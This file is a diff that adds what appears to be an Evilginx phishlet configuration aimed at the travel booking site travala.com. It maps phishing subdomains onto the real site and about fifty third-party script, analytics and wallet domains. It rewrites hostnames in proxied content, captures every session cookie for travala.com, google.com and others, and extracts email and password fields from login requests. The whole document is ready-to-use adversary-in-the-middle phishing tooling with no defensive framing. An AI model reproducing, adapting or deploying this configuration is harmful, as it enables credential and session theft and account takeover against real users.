@@ -1,0 +1,133 @@
+author: '@EvilWhales'
+min_ver: '3.3.0'
+
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'travala.com', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'static', orig_sub: 'static', domain: 'travala.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'fonts', orig_sub: 'fonts', domain: 'googleapis.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'www1', orig_sub: 'www', domain: 'googletagmanager.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'cdnjs', orig_sub: 'cdnjs', domain: 'cloudflare.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'fontss', orig_sub: 'fonts', domain: 'gstatic.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'dev', orig_sub: 'dev', domain: 'visualwebsiteoptimizer.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'www2', orig_sub: 'www', domain: 'google.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'www3', orig_sub: 'www', domain: 'google-analytics.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'statics', orig_sub: 'static', domain: 'ads-twitter.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'www4', orig_sub: 'www', domain: 'redditstatic.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'tag', orig_sub: 'tag', domain: 'adrsbl.io', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'connect', orig_sub: 'connect', domain: 'facebook.net', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: '514003226.collect', orig_sub: '514003226.collect', domain: 'igodigital.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'edge', orig_sub: 'edge', domain: 'fullstory.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'snap', orig_sub: 'snap', domain: 'licdn.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'www5', orig_sub: 'www', domain: 'clarity.ms', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'googleads.g', orig_sub: 'googleads.g', domain: 'doubleclick.net', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'www6', orig_sub: 'www', domain: 'google.ru', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'script', orig_sub: 'script', domain: 'tapfiliate.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'analytics', orig_sub: 'analytics', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'rs', orig_sub: 'rs', domain: 'fullstory.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 's2', orig_sub: 's2', domain: 'adform.net', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'track', orig_sub: 'track', domain: 'adform.net', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'px.ads', orig_sub: 'px.ads', domain: 'linkedin.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'www7', orig_sub: 'www', domain: 'facebook.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'a', orig_sub: 'a', domain: 'clarity.ms', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'staticc', orig_sub: 'static', domain: 'cloudflareinsights.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'cdn', orig_sub: 'cdn', domain: 'mouseflow.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'o253250.ingest.us', orig_sub: 'o253250.ingest.us', domain: 'sentry.io', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'public', orig_sub: 'public', domain: 'bnbstatic.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'www8', orig_sub: 'www', domain: 'recaptcha.net', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'api', orig_sub: 'api', domain: 'travala.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'www9', orig_sub: 'www', domain: 'gstatic.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'ekr', orig_sub: 'ekr', domain: 'zdassets.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'statc', orig_sub: 'static', domain: 'zdassets.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'pulse', orig_sub: 'pulse', domain: 'walletconnect.org', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'apis', orig_sub: 'api', domain: 'web3modal.org', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'travala', orig_sub: 'travala', domain: 'zendesk.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'staatic', orig_sub: 'static', domain: 'hotjar.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'widget', orig_sub: 'widget', domain: 'trustpilot.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'cdn-ukwest', orig_sub: 'cdn-ukwest', domain: 'onetrust.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'geolocation', orig_sub: 'geolocation', domain: 'onetrust.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'scripts', orig_sub: 'script', domain: 'hotjar.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'maxcdn', orig_sub: 'maxcdn', domain: 'bootstrapcdn.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'aip', orig_sub: 'api', domain: 'commonservice.io', session: true, is_landing: false, auto_filter: true}
+
+#application/octet-stream
+sub_filters:
+  - {triggers_on: 'www.travala.com', orig_sub: 'www', domain: 'travala.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/javascript', 'application/json', 'image/png', 'image/svg+xml', 'image/x-icon','application/manifest+json','text/javascript']}
+  - {triggers_on: 'www.travala.com', orig_sub: 'static', domain: 'travala.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/javascript', 'application/json', 'image/png', 'image/svg+xml', 'image/x-icon','application/manifest+json','text/javascript']}
+  - {triggers_on: 'www.travala.com', orig_sub: 'fonts', domain: 'googleapis.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/javascript', 'application/json', 'image/png', 'image/svg+xml', 'image/x-icon','application/manifest+json','text/javascript']}
+  - {triggers_on: 'www.travala.com', orig_sub: 'www', domain: 'googletagmanager.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/javascript', 'application/json', 'image/png', 'image/svg+xml', 'image/x-icon','application/manifest+json','text/javascript']}
+  - {triggers_on: 'www.travala.com', orig_sub: 'cdnjs', domain: 'cloudflare.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/javascript', 'application/json', 'image/png', 'image/svg+xml', 'image/x-icon','application/manifest+json','text/javascript']}
+  - {triggers_on: 'www.travala.com', orig_sub: 'fonts', domain: 'gstatic.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/javascript', 'application/json', 'image/png', 'image/svg+xml', 'image/x-icon','application/manifest+json','text/javascript']}
+  - {triggers_on: 'www.travala.com', orig_sub: 'dev', domain: 'visualwebsiteoptimizer.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/javascript', 'application/json', 'image/png', 'image/svg+xml', 'image/x-icon','application/manifest+json','text/javascript']}
+  - {triggers_on: 'www.travala.com', orig_sub: 'www', domain: 'google.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/javascript', 'application/json', 'image/png', 'image/svg+xml', 'image/x-icon','application/manifest+json','text/javascript']}
+  - {triggers_on: 'www.travala.com', orig_sub: 'www', domain: 'google-analytics.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/javascript', 'application/json', 'image/png', 'image/svg+xml', 'image/x-icon','application/manifest+json','text/javascript']}
+  - {triggers_on: 'www.travala.com', orig_sub: 'static', domain: 'ads-twitter.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/javascript', 'application/json', 'image/png', 'image/svg+xml', 'image/x-icon','application/manifest+json','text/javascript']}
+  - {triggers_on: 'www.travala.com', orig_sub: 'www', domain: 'redditstatic.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/javascript', 'application/json', 'image/png', 'image/svg+xml', 'image/x-icon','application/manifest+json','text/javascript']}
+  - {triggers_on: 'www.travala.com', orig_sub: 'tag', domain: 'adrsbl.io', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/javascript', 'application/json', 'image/png', 'image/svg+xml', 'image/x-icon','application/manifest+json','text/javascript']}
+  - {triggers_on: 'www.travala.com', orig_sub: 'connect', domain: 'facebook.net', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/javascript', 'application/json', 'image/png', 'image/svg+xml', 'image/x-icon','application/manifest+json','text/javascript']}
+  - {triggers_on: 'www.travala.com', orig_sub: '514003226.collect', domain: 'igodigital.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/javascript', 'application/json', 'image/png', 'image/svg+xml', 'image/x-icon','application/manifest+json','text/javascript']}
+  - {triggers_on: 'www.travala.com', orig_sub: 'edge', domain: 'fullstory.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/javascript', 'application/json', 'image/png', 'image/svg+xml', 'image/x-icon','application/manifest+json','text/javascript']}
+  - {triggers_on: 'www.travala.com', orig_sub: 'snap', domain: 'licdn.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/javascript', 'application/json', 'image/png', 'image/svg+xml', 'image/x-icon','application/manifest+json','text/javascript']}
+  - {triggers_on: 'www.travala.com', orig_sub: 'www', domain: 'clarity.ms', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/javascript', 'application/json', 'image/png', 'image/svg+xml', 'image/x-icon','application/manifest+json','text/javascript']}
+  - {triggers_on: 'www.travala.com', orig_sub: 'googleads.g', domain: 'doubleclick.net', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/javascript', 'application/json', 'image/png', 'image/svg+xml', 'image/x-icon','application/manifest+json','text/javascript']}
+  - {triggers_on: 'www.travala.com', orig_sub: 'www', domain: 'google.ru', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/javascript', 'application/json', 'image/png', 'image/svg+xml', 'image/x-icon','application/manifest+json','text/javascript']}
+  - {triggers_on: 'www.travala.com', orig_sub: 'script', domain: 'tapfiliate.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/javascript', 'application/json', 'image/png', 'image/svg+xml', 'image/x-icon','application/manifest+json','text/javascript']}
+  - {triggers_on: 'www.travala.com', orig_sub: 'analytics', domain: 'google.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/javascript', 'application/json', 'image/png', 'image/svg+xml', 'image/x-icon','application/manifest+json','text/javascript']}
+  - {triggers_on: 'www.travala.com', orig_sub: 'rs', domain: 'fullstory.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/javascript', 'application/json', 'image/png', 'image/svg+xml', 'image/x-icon','application/manifest+json','text/javascript']}
+  - {triggers_on: 'www.travala.com', orig_sub: 's2', domain: 'adform.net', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/javascript', 'application/json', 'image/png', 'image/svg+xml', 'image/x-icon','application/manifest+json','text/javascript']}
+  - {triggers_on: 'www.travala.com', orig_sub: 'track', domain: 'adform.net', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/javascript', 'application/json', 'image/png', 'image/svg+xml', 'image/x-icon','application/manifest+json','text/javascript']}
+  - {triggers_on: 'www.travala.com', orig_sub: 'px.ads', domain: 'linkedin.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/javascript', 'application/json', 'image/png', 'image/svg+xml', 'image/x-icon','application/manifest+json','text/javascript']}
+  - {triggers_on: 'www.travala.com', orig_sub: 'www', domain: 'facebook.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/javascript', 'application/json', 'image/png', 'image/svg+xml', 'image/x-icon','application/manifest+json','text/javascript']}
+  - {triggers_on: 'www.travala.com', orig_sub: 'a', domain: 'clarity.ms', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/javascript', 'application/json', 'image/png', 'image/svg+xml', 'image/x-icon','application/manifest+json','text/javascript']}
+  - {triggers_on: 'www.travala.com', orig_sub: 'static', domain: 'cloudflareinsights.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/javascript', 'application/json', 'image/png', 'image/svg+xml', 'image/x-icon','application/manifest+json','text/javascript']}
+  - {triggers_on: 'www.travala.com', orig_sub: 'cdn', domain: 'mouseflow.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/javascript', 'application/json', 'image/png', 'image/svg+xml', 'image/x-icon','application/manifest+json','text/javascript']}
+  - {triggers_on: 'www.travala.com', orig_sub: 'o253250.ingest.us', domain: 'sentry.io', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/javascript', 'application/json', 'image/png', 'image/svg+xml', 'image/x-icon','application/manifest+json','text/javascript']}
+  - {triggers_on: 'www.travala.com', orig_sub: 'public', domain: 'bnbstatic.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/javascript', 'application/json', 'image/png', 'image/svg+xml', 'image/x-icon','application/manifest+json','text/javascript']}
+  - {triggers_on: 'www.travala.com', orig_sub: 'accounts', domain: 'google.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/javascript', 'application/json', 'image/png', 'image/svg+xml', 'image/x-icon','application/manifest+json','text/javascript']}
+  - {triggers_on: 'www.travala.com', orig_sub: 'www', domain: 'recaptcha.net', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/javascript', 'application/json', 'image/png', 'image/svg+xml', 'image/x-icon','application/manifest+json','text/javascript']}
+  - {triggers_on: 'www.travala.com', orig_sub: 'api', domain: 'travala.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/javascript', 'application/json', 'image/png', 'image/svg+xml', 'image/x-icon','application/manifest+json','text/javascript']}
+  - {triggers_on: 'www.travala.com', orig_sub: 'www', domain: 'gstatic.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/javascript', 'application/json', 'image/png', 'image/svg+xml', 'image/x-icon','application/manifest+json','text/javascript']}
+  - {triggers_on: 'www.travala.com', orig_sub: 'ekr', domain: 'zdassets.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/javascript', 'application/json', 'image/png', 'image/svg+xml', 'image/x-icon','application/manifest+json','text/javascript']}
+  - {triggers_on: 'www.travala.com', orig_sub: 'static', domain: 'zdassets.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/javascript', 'application/json', 'image/png', 'image/svg+xml', 'image/x-icon','application/manifest+json','text/javascript']}
+  - {triggers_on: 'www.travala.com', orig_sub: 'widget', domain: 'trustpilot.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/javascript', 'application/json', 'image/png', 'image/svg+xml', 'image/x-icon','application/manifest+json','text/javascript']}
+  - {triggers_on: 'www.travala.com', orig_sub: 'cdn-ukwest', domain: 'onetrust.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/javascript', 'application/json', 'image/png', 'image/svg+xml', 'image/x-icon','application/manifest+json','text/javascript']}
+  - {triggers_on: 'www.travala.com', orig_sub: 'geolocation', domain: 'onetrust.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/javascript', 'application/json', 'image/png', 'image/svg+xml', 'image/x-icon','application/manifest+json','text/javascript']}
+  - {triggers_on: 'www.travala.com', orig_sub: 'script', domain: 'hotjar.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/javascript', 'application/json', 'image/png', 'image/svg+xml', 'image/x-icon','application/manifest+json','text/javascript']}
+  - {triggers_on: 'www.travala.com', orig_sub: 'maxcdn', domain: 'bootstrapcdn.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/javascript', 'application/json', 'image/png', 'image/svg+xml', 'image/x-icon','application/manifest+json','text/javascript']}
+  - {triggers_on: 'www.travala.com', orig_sub: 'api', domain: 'commonservice.io', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/javascript', 'application/json', 'image/png', 'image/svg+xml', 'image/x-icon','application/manifest+json','text/javascript']}
+
+  - {triggers_on: 'cdnjs.cloudflare.com', orig_sub: 'cdnjs', domain: 'cloudflare.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/javascript', 'application/json', 'image/png', 'image/svg+xml', 'image/x-icon','application/manifest+json','text/javascript']}
+  - {triggers_on: 'www.google.com', orig_sub: 'www', domain: 'google.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/javascript', 'application/json', 'image/png', 'image/svg+xml', 'image/x-icon','application/manifest+json','text/javascript']}
+  - {triggers_on: 'public.travala.com', orig_sub: 'public', domain: 'bnbstatic.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/javascript', 'application/json', 'image/png', 'image/svg+xml', 'image/x-icon','application/manifest+json','text/javascript']}
+  - {triggers_on: 'static.cloudflareinsights.com', orig_sub: 'static', domain: 'cloudflareinsights.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/javascript', 'application/json', 'image/png', 'image/svg+xml', 'image/x-icon','application/manifest+json','text/javascript']}
+  - {triggers_on: 'www.gstatic.com', orig_sub: 'www', domain: 'gstatic.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/javascript', 'application/json', 'image/png', 'image/svg+xml', 'image/x-icon','application/manifest+json','text/javascript']}
+  - {triggers_on: 'www.recaptcha.net', orig_sub: 'www', domain: 'recaptcha.net', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/javascript', 'application/json', 'image/png', 'image/svg+xml', 'image/x-icon','application/manifest+json','text/javascript']}
+
+auth_tokens:
+  - domain: '.travala.com'
+    keys: ['.*,regexp']
+  - domain: '.google.com'
+    keys: ['.*,regexp']
+  - domain: 'www.recaptcha.net'
+    keys: ['.*,regexp']
+  - domain: '.adrsbl.io'
+    keys: ['.*,regexp']
+  - domain: '.www.travala.com'
+    keys: ['.*,regexp']
+
+auth_urls:
+  - "/"
+
+credentials:
+  username:
+    key: 'email'
+    search: '"email":"([^"]*)'
+    type: 'json'
+  password:
+    key: 'password'
+    search: '"password":"([^"]*)'
+    type: 'json'
+
+login:
+  domain: 'www.travala.com'
+  path: '/'
